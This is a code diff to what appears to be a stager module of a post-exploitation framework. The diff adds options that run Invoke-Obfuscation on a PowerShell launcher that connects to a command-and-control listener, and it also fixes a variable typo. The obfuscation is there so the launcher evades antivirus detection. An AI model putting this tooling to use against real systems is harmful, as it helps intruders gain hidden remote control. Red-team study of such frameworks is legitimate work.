@@ -1,6 +1,5 @@
 from lib.common import helpers
 import random
-import random, string
 
 class Stager:
 
@@ -37,6 +36,16 @@ class Stager:
                 'Required'      :   False,
                 'Value'         :   '/tmp/scrambled'
             },
+            'Obfuscate' : {
+                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.',
+                'Required'      :   False,
+                'Value'         :   'False'
+            },
+            'ObfuscateCommand' : {
+                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True.',
+                'Required'      :   False,
+                'Value'         :   'Token,All,1,home,Encoding,3,home,Launcher,STDIN++,12467'
+            },
             'NoiseLevel' : {
                 'Description'   :   'Sets the amount of noise to add (default=3, 0=no noise)',
                 'Required'      :   True,
@@ -67,7 +76,7 @@ class Stager:
             # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
-                self.options[option]['Value'] = valu
+                self.options[option]['Value'] = value
 
     def addnoise(self, payload,level=1):
         charset='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-+={}[];:|,.<>?~_'
@@ -93,6 +102,7 @@ class Stager:
 
         return scrambledpayload, noisechars
 
+
     def generate(self):
 
         # extract all of our options
@@ -102,8 +112,14 @@ class Stager:
         proxyCreds = self.options['ProxyCreds']['Value']
         stagerRetries = self.options['StagerRetries']['Value']
         noiselevel = int(self.options['NoiseLevel']['Value'])
+        obfuscate = self.options['Obfuscate']['Value']
+        obfuscateCommand = self.options['ObfuscateCommand']['Value']
 
-        # generate the launcher code
+        obfuscateScript = False
+        if obfuscate.lower() == "true":
+            obfuscateScript = True
+
+ # generate the launcher code
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
 		
         if launcher == "":
